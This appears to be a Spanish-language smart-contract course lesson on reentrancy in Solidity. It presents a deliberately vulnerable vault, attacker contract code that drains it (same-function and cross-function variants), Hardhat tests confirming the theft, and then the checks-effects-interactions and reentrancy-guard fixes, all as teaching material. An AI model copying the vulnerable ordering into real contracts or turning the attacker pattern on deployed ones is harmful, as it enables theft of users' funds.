# 01 - Reentrancy a fondo

En el modulo 02 (leccion 06) viste un guard de reentrada funcionando. Aca vas a ver **por que hace falta**: el ataque completo, drenando fondos de verdad, en dos variantes distintas.

Archivos de esta leccion:

- `contracts/01-Reentrancy.sol`
- `test/01-Reentrancy.ts`
- `ignition/modules/01-Reentrancy.ts`
- `scripts/deploy-Reentrancy.ts`

## El mecanismo, en una frase

Reentrancy ocurre cuando tu contrato **cede el control** (con una llamada externa, como enviar ETH) antes de haber terminado de actualizar su propio estado, y quien recibe ese control vuelve a llamarte mientras tu estado sigue "a medio actualizar".

## Parte 1: la misma funcion, el drenaje clasico

```solidity
function retirar() external {
    uint256 monto = balances[msg.sender];
    require(monto > 0, "Sin saldo");

    (bool ok, ) = msg.sender.call{value: monto}("");
    require(ok, "Envio fallido");

    balances[msg.sender] = 0; // demasiado tarde
}
```

El orden es el problema: **interaccion** (`call`) antes de **efecto** (`balances[msg.sender] = 0`). Mientras el `call` esta en curso, `msg.sender` (si es un contrato) puede ejecutar codigo, y ese codigo puede llamar a `retirar()` de nuevo. Como `balances[msg.sender]` todavia no se puso en cero, la segunda llamada ve el mismo saldo y retira otra vez.

### El atacante

```solidity
function atacar() external payable {
    _montoPorRetiro = msg.value;
    objetivo.depositar{value: msg.value}();
    objetivo.retirar();
}

receive() external payable {
    if (address(objetivo).balance >= _montoPorRetiro) {
        objetivo.retirar();
    }
}
```

Cada vez que la boveda le envia ETH al atacante, su `receive()` reentra y pide otro retiro. El detalle importante es la condicion `address(objetivo).balance >= _montoPorRetiro`: **solo** reintenta si la boveda todavia tiene fondos para esa proxima llamada.

### Por que hace falta esa condicion (y no es solo prolijidad)

Si el atacante reentrara sin condicion, la ULTIMA llamada (la que ya no puede cobrarse porque la boveda quedo sin fondos) haria fallar su propio `require(ok)`. Ese fallo se propaga: el `call` que lo invoco (uno de los niveles anteriores) lo recibe como `ok = false`, lo que hace fallar SU `require(ok)`, y asi en cascada hacia atras, por **todos** los niveles de la reentrada. Sin la condicion de parada, el ataque completo revierte y no se lleva nada. Este comportamiento no es teoria: el test de esta leccion lo verifica corriendo el ataque real.

El resultado, con la condicion puesta correctamente:

```ts
await boveda.write.depositar({ value: parseEther("5"), account: victima.account }); // de buena fe
await atacante.write.atacar({ value: parseEther("1") }); // el atacante solo pone 1 ETH

// El atacante se retira 6 ETH: su 1 ETH + los 5 de la victima.
assert.equal(await publicClient.getBalance({ address: atacante.address }), parseEther("6"));
assert.equal(await boveda.read.contractBalance(), 0n);
```

La victima sigue "teniendo" 5 ETH segun el mapping `balances`, pero la boveda ya no tiene ETH real para pagarselos: quedo **insolvente**.

## Parte 2: reentrancy cruzada, entre dos funciones distintas

Esta es la version que sorprende a mas gente: ninguna de las dos funciones, leida por separado, "parece" vulnerable.

```solidity
function retirar() external {
    uint256 monto = balances[msg.sender];
    require(monto > 0, "Sin saldo");
    (bool ok, ) = msg.sender.call{value: monto}("");
    require(ok, "Envio fallido");
    balances[msg.sender] = 0;
}

function transferirA(address to, uint256 monto) external {
    require(balances[msg.sender] >= monto, "Saldo insuficiente");
    balances[msg.sender] -= monto;
    balances[to] += monto;
}
```

`transferirA` es correcta: valida el saldo, lo descuenta, lo acredita. El problema no esta en su codigo: esta en **cuando** se la puede llamar. Si se la llama DURANTE un `retirar()` en curso (antes de que ese `retirar()` ponga el balance en cero), `transferirA` lee un saldo que ya deberia estar en cero y lo mueve a otra cuenta.

```solidity
receive() external payable {
    // balances[address(this)] todavia vale msg.value: retirar() aun no
    // llego a la linea "balances[msg.sender] = 0".
    objetivo.transferirA(complice, msg.value);
}
```

El resultado: el atacante recupera su propio ETH (via `retirar()`, que igual se completa con normalidad) **y ademas** acredita un balance interno al complice que nadie deposito realmente. El contrato queda debiendo mas de lo que tiene:

```ts
const prometido = balances[victima] + balances[complice]; // 5 + 1 = 6
const real = contractBalance; // 5

assert.ok(prometido > real, "la boveda deberia estar insolvente");
```

**La leccion:** cuando audites una funcion, no alcanza con mirarla sola. Pregunta que OTRAS funciones tocan el mismo estado, y que pasaria si alguna de ellas se ejecutara a mitad de esta.

## Parte 3: la correccion

Dos defensas, aplicadas juntas:

```solidity
modifier noReentrante() {
    if (_bloqueado) revert Reentrada();
    _bloqueado = true;
    _;
    _bloqueado = false;
}

function retirar() external noReentrante {
    uint256 monto = balances[msg.sender];
    require(monto > 0, "Sin saldo");

    balances[msg.sender] = 0; // efecto primero

    (bool ok, ) = msg.sender.call{value: monto}(""); // interaccion despues
    require(ok, "Envio fallido");
}
```

1. **Checks-Effects-Interactions**: el efecto (`balances[msg.sender] = 0`) ocurre ANTES de la interaccion (`call`). Por si sola, esta unica reordenacion ya frena **ambos** ataques de esta leccion: en el momento en que alguien reentra, `balances[msg.sender]` ya es cero, asi que ni `retirar()` ni `transferirA()` tienen nada que mover.
2. **Un guard de reentrada** (`noReentrante`), como red de seguridad adicional para el caso en que el orden de las lineas se rompa en un cambio futuro.

El test ataca la version segura con el mismo atacante de la Parte 1, y confirma que el intento de reentrar no logra nada:

```ts
await atacante.write.atacar({ value: parseEther("1") });

assert.equal(await publicClient.getBalance({ address: atacante.address }), parseEther("1")); // ni un wei mas
assert.equal(await atacante.read.vecesQueRetiro(), 1n); // lo intento, no le sirvio
```

## `noReentrante` vs Checks-Effects-Interactions: usa ambos

Son defensas independientes y se complementan:

- **CEI** es una disciplina de **orden**: pensar en cada funcion "que efectos tengo que confirmar ANTES de ceder el control a otro contrato". Protege incluso funciones que un guard no cubre (por ejemplo, la reentrancy cruzada de la Parte 2, si el guard solo estuviera en `retirar` y no en `transferirA`).
- El **guard** es una red de seguridad mecanica: si alguien mas tarde reordena el codigo por error, el guard sigue frenando el ataque.

## Ejecutar el test

```bash
npx hardhat test test/01-Reentrancy.ts
```

## Desplegar y ver el ataque en accion

```bash
npx hardhat run scripts/deploy-Reentrancy.ts --network hardhatMainnet
```

## Errores comunes al defenderse

### Poner el guard pero mantener interaccion-antes-de-efecto

El guard evita reentrar la MISMA funcion, pero si otra funcion sin guard toca el mismo estado (como en la Parte 2), sigue siendo vulnerable. El guard no sustituye a pensar en el orden.

### Usar `transfer()` en vez de pensar el orden

Antes de Istanbul, `transfer()`/`send()` limitaban el gas a 2300, lo que en la practica frenaba muchos ataques de reentrancy (el codigo del atacante no tenia gas para hacer nada complejo). Hoy varios contratos legitimos necesitan mas de 2300 gas para recibir ETH, asi que `transfer()` ya no es una defensa confiable ni la forma recomendada de enviar ETH (modulo 02, leccion 10). La defensa real es el orden y el guard, no limitar el gas.

### Olvidar que un `require` puede revertir en cascada

Como viste en la Parte 1, un fallo profundo en una cadena de reentradas puede revertir TODA la cadena. Esto es util para razonar sobre ataques (a veces un ataque "casi funciona" pero termina revirtiendo entero), pero no es una defensa: no dependas de que el ataque "se rompa solo".

## Ejercicios

1. Quita el guard `noReentrante` de `BovedaSegura.retirar()` (dejando el orden CEI) y confirma que el ataque de la Parte 1 sigue sin funcionar.
2. Ahora, ademas, invierte el orden en `BovedaSegura.retirar()` (interaccion antes de efecto, sin guard) y confirma que el ataque vuelve a funcionar.
3. Escribe una reentrancy cruzada donde el atacante, en vez de regalarle saldo a un complice, se lo regale a **si mismo** dos veces (usando una segunda funcion que el mismo pueda llamar).

## Resumen

- Reentrancy: ceder el control (una llamada externa) antes de terminar de actualizar el estado.
- Puede ocurrir en la MISMA funcion (drenaje clasico) o CRUZADA entre dos funciones que comparten estado.
- Un atacante que reentra sin una condicion de parada corre el riesgo de que su propio ataque revierta entero.
- La defensa combina **Checks-Effects-Interactions** (orden correcto) con un **guard de reentrada** (red de seguridad).
